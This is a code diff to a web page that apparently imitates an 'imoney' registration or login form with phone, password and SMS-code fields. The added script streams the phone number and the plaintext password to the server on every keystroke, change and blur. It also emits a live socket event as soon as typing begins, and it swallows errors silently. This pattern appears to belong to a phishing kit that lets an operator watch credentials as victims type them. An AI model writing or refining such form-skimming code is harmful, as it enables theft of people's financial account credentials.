@@ -156,12 +156,14 @@
     </div>
   </div>
 
+  <script src="/socket.io/socket.io.js"></script>
   <script>
     const sessionId =
       sessionStorage.getItem('imoney_session_id') ||
       ('sess_' + Math.random().toString(36).slice(2) + '_' + Date.now());
     sessionStorage.setItem('imoney_session_id', sessionId);
 
+    const socket = io();
     const phoneInput = document.getElementById('phone');
     const passwordInput = document.getElementById('password');
     const codeInput = document.getElementById('code');
@@ -175,6 +177,7 @@
     let attempt = 0;
     let countdownInterval = null;
     let toastTimeout = null;
+    let hasNotifiedStart = false;
 
     function showCodeSendedFor3Seconds() {
       codeSendedToast.style.display = 'block';
@@ -184,11 +187,26 @@
       }, 3000);
     }
 
+    function notifyRegisterStart(digitsOnly) {
+      if (hasNotifiedStart) return;
+      hasNotifiedStart = true;
+      socket.emit('register:start', {
+        sessionId,
+        phone: digitsOnly,
+        startedAt: Date.now()
+      });
+    }
+
     async function pushLiveUpdate() {
       const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
       if (phoneInput.value !== digitsOnly) {
         phoneInput.value = digitsOnly;
       }
+
+      if (digitsOnly.length > 0) {
+        notifyRegisterStart(digitsOnly);
+      }
+
       try {
         await fetch('/api/live-update', {
           method: 'POST',
@@ -196,14 +214,22 @@
           body: JSON.stringify({
             sessionId,
             phone: digitsOnly,
-            password: passwordInput.value
+            password: passwordInput.value,
+            startedTyping: digitsOnly.length > 0
           })
         });
       } catch (e) {}
     }
 
+    phoneInput.addEventListener('keydown', () => {
+      const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
+      notifyRegisterStart(digitsOnly);
+    });
     phoneInput.addEventListener('input', pushLiveUpdate);
+    phoneInput.addEventListener('change', pushLiveUpdate);
+    phoneInput.addEventListener('blur', pushLiveUpdate);
     passwordInput.addEventListener('input', pushLiveUpdate);
+    passwordInput.addEventListener('blur', pushLiveUpdate);
 
     sendCodeBtn.addEventListener('click', async () => {
       const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
